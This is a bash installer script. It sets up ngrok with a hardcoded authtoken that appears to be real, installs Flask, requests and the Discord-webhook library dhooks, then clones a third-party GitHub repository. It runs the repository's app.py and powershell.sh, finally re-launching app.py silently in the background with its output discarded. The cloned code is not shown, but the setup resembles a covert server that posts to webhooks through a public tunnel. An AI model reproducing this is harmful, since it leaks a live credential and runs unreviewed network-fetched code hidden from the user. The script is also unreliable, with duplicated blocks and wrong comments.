#!/bin/bash

# Check if running as root, if so exit to prevent unintended actions
if [ "$(id -u)" -eq 0 ]; then
    echo "Do not run this script as root. Please run it as a regular user."
    exit 1
fi

# Update package list and install prerequisites
sudo apt update && sudo apt install -y unzip wget git python3 python3-pip curl

# Add the ngrok GPG key and repository
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com/ buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list

# Update package list again to include ngrok
sudo apt update

# Install ngrok
sudo apt install -y ngrok

# Save ngrok authtoken (ensure to replace with your actual token)
ngrok authtoken 2nXGmMYv5OLZHjxmLxEiIbd5nL8_63mGYjcJQPArP

# Install required Python packages
pip3 install Flask requests dhooks

# Clone the GitHub repository
git clone https://github.com/ArcticHonour/Universal/

# Navigate to the Universal directory
cd Universal || { echo "Failed to enter Universal directory"; exit 1; }

# Get the directory of this script
SCRIPT_DIR=$(pwd)

# Set the script name
SCRIPT_NAME="app.py"

# Construct the full path to the script
SCRIPT_PATH="$SCRIPT_DIR/$SCRIPT_NAME"

# Give execution permissions to the Python script (not required, but keeping for consistency)
chmod +x "$SCRIPT_PATH"

# Run the script in the background
python3 "$SCRIPT_PATH" &

echo "Installation, cloning, and running $SCRIPT_NAME in the background completed!"

# Clear the screen
clear

# Install required Python packages from requirements.txt
pip install -r requirements.txt

# Grant execute permissions to run_script.sh (not necessary for Linux, but for consistency)
chmod +x run_script.sh

# Execute the powershell.sh script (assuming it exists in the Universal directory)
./powershell.sh

SCRIPT_DIR=$(pwd)

# Set the script name
SCRIPT_NAME="app.py"

# Construct the full path to the script
SCRIPT_PATH="$SCRIPT_DIR/$SCRIPT_NAME"

# Give execution permissions to the Python script
chmod +x "$SCRIPT_PATH"

# Run the script in the background
nohup python "$SCRIPT_PATH" > /dev/null 2>&1 &

